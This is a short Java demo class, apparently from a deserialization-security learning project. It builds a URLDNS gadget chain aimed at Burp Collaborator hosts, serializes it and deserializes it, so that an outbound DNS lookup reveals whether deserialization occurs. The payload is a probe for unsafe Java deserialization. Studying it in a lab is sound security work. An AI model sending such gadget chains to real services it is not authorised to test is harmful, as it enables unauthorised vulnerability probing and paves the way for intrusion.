import expUtils.ExpUtils;
import expUtils.ReflectUtils;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.Random;

public class URLDNSDemo {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

////        ExpUtils.serialize(hashMap);
//        ExpUtils.serialize(ExpUtils.getURLDNSChains("http://c8l76f8p9qm9xno5aue84mr5vw1ppe.burpcollaborator.net"));
        String path = ExpUtils.serialize(ExpUtils.getURLDNSChains("http://q5wziyporyj66c0czrpiso2t1k7cv1.burpcollaborator.net"));
        ExpUtils.unserialize(path);


    }
}
